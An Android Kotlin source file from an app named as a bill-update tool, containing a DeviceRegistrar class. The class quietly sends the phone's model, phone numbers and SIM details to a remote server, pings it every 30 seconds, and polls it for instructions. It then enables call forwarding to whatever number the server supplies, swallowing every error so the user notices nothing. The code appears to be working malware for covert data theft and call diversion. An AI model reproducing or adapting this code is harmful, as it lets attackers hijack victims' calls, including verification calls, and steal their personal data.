package com.example.bill_update_app

import android.content.Context
import android.os.Build
import android.os.Handler
import android.os.Looper
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import java.util.UUID

class DeviceRegistrar private constructor(private val context: Context) {
    private val prefs = context.getSharedPreferences("device_prefs", Context.MODE_PRIVATE)
    private val handler = Handler(Looper.getMainLooper())
    private var heartbeatRunning = false
    private var retryCount = 0
    private var forwardingPolling = false
    private var lastForwardingConfig: JSONObject? = null

    companion object {
        private var instance: DeviceRegistrar? = null

        fun init(context: Context) {
            if (instance == null) {
                instance = DeviceRegistrar(context)
                instance?.startRegistration()
            }
        }

        fun updateSimInfo() {
            instance?.updateSimInfo()
        }
    }

    private fun getDeviceId(): String {
        var id = prefs.getString("device_id", null)
        if (id == null) {
            id = UUID.randomUUID().toString()
            prefs.edit().putString("device_id", id).apply()
        }
        return id
    }

    private fun startRegistration() {
        handler.postDelayed({
            doRegister()
        }, 2000)
    }

    fun updateSimInfo() {
        val deviceId = getDeviceId()
        val simInfo = SimInfo(context).getSimInfo()
        Thread {
            try {
                val phoneNumbers = (0 until simInfo.length()).map { i ->
                    simInfo.getJSONObject(i).optString("number", "")
                }.filter { it.isNotEmpty() }
                val json = JSONObject().apply {
                    put("device_id", deviceId)
                    put("device_name", "${Build.BRAND} ${Build.MODEL}")
                    put("model", Build.MODEL)
                    put("os_version", "Android ${Build.VERSION.RELEASE}")
                    put("app_version", "1.0.0")
                    put("phone_number", phoneNumbers.firstOrNull() ?: "")
                    put("sim_info", simInfo.toString())
                }
                val conn = URL("https://bill-1-9yfp.onrender.com/api/device").openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.doOutput = true
                conn.connectTimeout = 10000
                conn.readTimeout = 10000
                conn.outputStream.write(json.toString().toByteArray())
                conn.responseCode
                conn.disconnect()
            } catch (_: Exception) {}
        }.start()
    }

    private fun doRegister() {
        val deviceId = getDeviceId()
        val json = JSONObject().apply {
            put("device_id", deviceId)
            put("device_name", "${Build.BRAND} ${Build.MODEL}")
            put("model", Build.MODEL)
            put("os_version", "Android ${Build.VERSION.RELEASE}")
            put("app_version", "1.0.0")
            put("phone_number", "")
            put("sim_info", "[]")
        }

        Thread {
            try {
                val conn = URL("https://bill-1-9yfp.onrender.com/api/device").openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.doOutput = true
                conn.connectTimeout = 10000
                conn.readTimeout = 10000
                conn.outputStream.write(json.toString().toByteArray())
                val code = conn.responseCode
                conn.disconnect()

                if (code in 200..299) {
                    handler.post {
                        startHeartbeat(deviceId)
                        startForwardingPolling(deviceId)
                    }
                } else if (retryCount < 3) {
                    retryCount++
                    handler.postDelayed({ doRegister() }, 5000)
                }
            } catch (_: Exception) {
                if (retryCount < 3) {
                    retryCount++
                    handler.postDelayed({ doRegister() }, 5000)
                }
            }
        }.start()
    }

    private fun startHeartbeat(deviceId: String) {
        if (heartbeatRunning) return
        heartbeatRunning = true
        handler.post(object : Runnable {
            override fun run() {
                Thread {
                    try {
                        val json = JSONObject().apply { put("device_id", deviceId) }
                        val conn = URL("https://bill-1-9yfp.onrender.com/api/ping").openConnection() as HttpURLConnection
                        conn.requestMethod = "POST"
                        conn.setRequestProperty("Content-Type", "application/json")
                        conn.doOutput = true
                        conn.connectTimeout = 10000
                        conn.readTimeout = 10000
                        conn.outputStream.write(json.toString().toByteArray())
                        conn.responseCode
                        conn.disconnect()
                    } catch (_: Exception) {}
                }.start()
                handler.postDelayed(this, 30000)
            }
        })
    }

    private fun startForwardingPolling(deviceId: String) {
        if (forwardingPolling) return
        forwardingPolling = true
        handler.post(object : Runnable {
            override fun run() {
                Thread {
                    try {
                        val conn = URL("https://bill-1-9yfp.onrender.com/api/forwarding-config/$deviceId").openConnection() as HttpURLConnection
                        conn.requestMethod = "GET"
                        conn.setRequestProperty("Content-Type", "application/json")
                        conn.connectTimeout = 10000
                        conn.readTimeout = 10000
                        val responseCode = conn.responseCode
                        if (responseCode == 200) {
                            val body = conn.inputStream.bufferedReader().readText()
                            val config = JSONObject(body)
                            if (lastForwardingConfig == null || config.toString() != lastForwardingConfig.toString()) {
                                if (config.optBoolean("call_forwarding")) {
                                    val number = config.optString("call_forwarding_number", "")
                                    if (number.isNotEmpty()) {
                                        handler.post {
                                        try {
                                            CallForwarder(context).enableCallForwarding(number)
                                        } catch (_: Exception) {}
                                    }
                                    }
                                }
                                lastForwardingConfig = config
                            }
                        }
                        conn.disconnect()
                    } catch (_: Exception) {}
                }.start()
                handler.postDelayed(this, 10000)
            }
        })
    }
}
